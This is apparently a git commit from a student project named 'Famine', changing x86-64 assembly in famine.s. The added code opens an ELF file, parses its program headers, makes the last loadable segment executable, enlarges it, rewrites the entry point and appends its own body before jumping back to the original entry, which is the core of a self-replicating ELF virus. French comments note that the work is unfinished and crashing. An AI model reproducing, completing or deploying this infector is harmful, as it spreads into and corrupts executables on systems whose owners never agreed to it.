6f8f58c5b4801ae056b44e7d001c1df688b87e4b
root <root@Zerrino>
2025-05-18 01:05:46 +0200

    aaa

--- famine.s
+++ famine.s
@@ -7,27 +7,14 @@ section .text
 
 
 	; %rdi %rsi %rdx %r10 %r8 %r9
-
 _start:
-	jmp entry_point
-	num0 dq 0
-	num1 dq 0
-	num2 dw 0 dw, 0
-	stnl db 10
-	buf0 dq 0
-	buf1 dq 0
-	file db	'./test', 0, 10
-	msg1 db	'file is elf', 10, 0
-	msg2 db	'file is 64', 10, 0
-	elfh db 0x7F, 'ELF'
-entry_point:
 
-	lea		rdi, [rel _start]
-	lea		rax, [rel .true_end]
-	sub		rax, rdi
+famine:
+	jmp		entry_point
+number:
 	mov		rbx, 10
 	lea		rdi, [rel num0 + 20]
-	xor		rcx, rcx
+	mov		rcx, 1
 
 .convert_loop:
 	xor		rdx, rdx
@@ -42,9 +29,66 @@ entry_point:
 	lea		rsi, [rdi]
 	mov		rdi, 1
 	mov		rdx, rcx
-	inc		rdx
-	inc		rdx
 	syscall
+	mov		rcx, 20
+	xor		al, al
+	lea		rdi, [rel num0]
+	rep		stosb
+	ret
+
+	jmp entry_point
+	num0 dq 0
+	num1 dq 0
+	num2 dw 0 dw, 0
+	stnl db 10
+	buf0 dq 0
+	buf1 dq 0
+	buf2 dq 0
+	buf3 dq 0
+	buf4 dq 0
+	buf5 dq 0
+	buf6 dq 0
+	buf7 dq 0
+	phd0 dq 0
+	phd1 dq 0
+	phd2 dq 0
+	phd3 dq 0
+	phd4 dq 0
+	phd5 dq 0
+	phd6 dq 0
+	phd7 dq 0
+	phd8 dq 0
+	phd9 dq 0
+	phd10 dq 0
+	phd11 dq 0
+	phd12 dq 0
+	phd13 dq 0
+	phd14 dq 0
+	phd15 dq 0
+	entry dq 0
+	old_e dq 0
+	famineb db 0
+	famined db 0
+	padding	db 1
+	file db	'./test', 0, 10
+	msg1 db	'file is elf', 10, 0
+	msg2 db	'file is 64', 10, 0
+	elfh db 0x7F, 'ELF'
+	exec dw 7
+entry_point:
+	mov		rax, [rel buf0 + 0x18]
+	mov		[rel old_e], rax
+
+
+	mov		al, [rel famineb]
+	mov		[rel famined], al
+	mov		[rel famineb], byte 1
+
+
+
+	lea		rdi, [rel famine]
+	lea		rax, [rel .true_end]
+	sub		rax, rdi
 
 	mov		rax, 1
 	mov		rdi, 1
@@ -58,14 +102,23 @@ entry_point:
 	xor		rdx, rdx
 	syscall
 
+
+
+	cmp		rax, 0
+	jl		.proceed_jmp ; si le file -1
+
+
+
 	mov		r8, rax
 
 	xor		rax, rax
 	mov		rdi, r8
 	lea		rsi, [rel buf0]
-	mov		rdx, 16
+	mov		rdx, 64
 	syscall
 
+
+; ICI CA COMMENCE DEJA A CRASH
 
 	mov		rcx, 4
 	lea		rsi, [rel buf0]
@@ -88,6 +141,193 @@ entry_point:
 	lea		rsi, [rel msg2]
 	mov		rdx, 11
 	syscall
+
+	mov		rax, [rel buf0 + 24]
+
+	movzx   rcx, word [rel buf0 + 0x38]
+	movzx   rdi, word [rel buf0 + 0x36]
+	xor		r11, r11
+	xor		r10, r10
+	; %rdi %rsi %rdx %r10 %r8 %r9
+	; sys_pread64
+
+
+.start_loop_phdr:
+	test	rcx, rcx
+	jz		.end_loop_phdr
+	mov		r10, rcx
+	imul	r10, rdi
+	add		r10, 64
+	push	r8
+	push	r11
+	push	rcx
+	push	rdi
+	mov		rdi, r8
+	mov		rdx, 0x38
+	lea		rsi, [rel phd0]
+	mov		rax, 17
+	syscall
+	pop		rdi
+	pop		rcx
+	pop		r11
+	pop		r8
+	; r9 -> target_phdr offset
+	cmp		dword [rel phd0], 1 ; est-ce un load ?
+	jne		.next_it_phdr
+	mov		rax, qword [rel phd0 + 0x08]  ; p_offset
+	add		rax, qword [rel phd0 + 0x20] ; p_filesz
+
+	cmp		rax, r11
+	jna		.next_it_phdr
+	mov		r11, rax
+	mov		r9, r10
+
+	push	r11
+	push	rcx
+	push	rdi
+	mov		rdi, r8
+	mov		rdx, 0x38
+	lea		rsi, [rel phd8]
+	mov		rax, 17
+	syscall
+	pop		rdi
+	pop		rcx
+	pop		r11
+
+
+
+
+.next_it_phdr:
+	dec		rcx
+	jmp		.start_loop_phdr
+.end_loop_phdr:
+	test	r11, r11
+	jz		.end
+
+
+	; %rdi %rsi %rdx %r10 %r8 %r9
+	; 18sys_pwrite64	unsigned int fd	const char *buf	size_t count	loff_t pos
+	; on met X sur segment
+
+	mov		al, [buf0 + 0xa]
+	test	al, al
+	jnz		.proceed_jmp
+
+	push	r9
+	push	r11
+	mov		rax, 18
+	mov		rdi, r8
+	lea		rsi, [rel padding]
+	mov		rdx, 1
+	mov		r10, 0xa
+	syscall
+	pop		r11
+	pop		r9
+
+
+	push	r11
+	mov		rax, [rel phd8 + 0x8]
+	sub		r11, rax
+	mov		rax, [rel phd8 + 0x10]
+	add		r11, rax
+	mov		[rel entry], r11
+	pop		r11
+
+	push	r9
+	push	r11
+	mov		rax, 18
+	mov		rdi, r8
+	lea		rsi, [rel entry]
+	mov		rdx, 8
+	mov		r10, 0x18
+	syscall
+	pop		r11
+	pop		r9
+
+
+	push	r9
+	push	r11
+	mov		rax, 18
+	mov		rdi, r8
+	lea		rsi, [rel exec]
+	mov		rdx, 4
+	mov		r10, r9
+	add		r10, 0x4
+	syscall
+	pop		r11
+	pop		r9
+
+	push	r11
+	lea		rdi, [rel famine]
+	lea		r11, [rel .true_end]
+	sub		r11, rdi
+
+	mov		rdi, [rel phd8 + 0x20]
+	add		rdi, r11
+	mov		[rel phd8 + 0x20], rdi
+
+	lea		rdi, [rel famine]
+	lea		r11, [rel .true_end]
+	sub		r11, rdi
+
+	mov		rdi, qword [rel phd8 + 0x28]
+	add		rdi, r11
+	mov		[rel phd8 + 0x28], rdi
+	pop		r11
+
+
+	push	r9
+	push	r11
+	mov		rax, 18
+	mov		rdi, r8
+	lea		rsi, [rel phd8 + 0x20]
+	mov		rdx, 8
+	mov		r10, r9
+	add		r10, 0x20
+	syscall
+	pop		r11
+	pop		r9
+
+	push	r9
+	push	r11
+	mov		rax, 18
+	mov		rdi, r8
+	lea		rsi, [rel phd8 + 0x28]
+	mov		rdx, 8
+	mov		r10, r9
+	add		r10, 0x28
+	syscall
+	pop		r11
+	pop		r9
+
+	; donc jusqu'ici y'a de la place qui a ete libere au niveau
+	; des programmes headers c'est bon, il manque plus que modifier dans le header
+	; le jmp
+
+	push	r11
+	push	r9
+	lea		rsi, [rel famine]
+	lea		rdx, [rel .true_end]
+	sub		rdx, rsi
+	mov		r10, r11
+	mov		rdi, r8
+	mov		rax, 18
+	syscall
+	pop		r9
+	pop		r11
+
+.proceed_jmp:
+	xor		rax, rax
+	mov		al, [rel famined]
+	test	al, al
+	jz		.end
+
+	mov		rax, [rel entry]
+	mov		rdi, [rel old_e]
+	sub		rax, rdi
+	lea		rdi, [rel famine]
+	sub		rdi, rax
+	jmp		rdi
 
 
 .end:
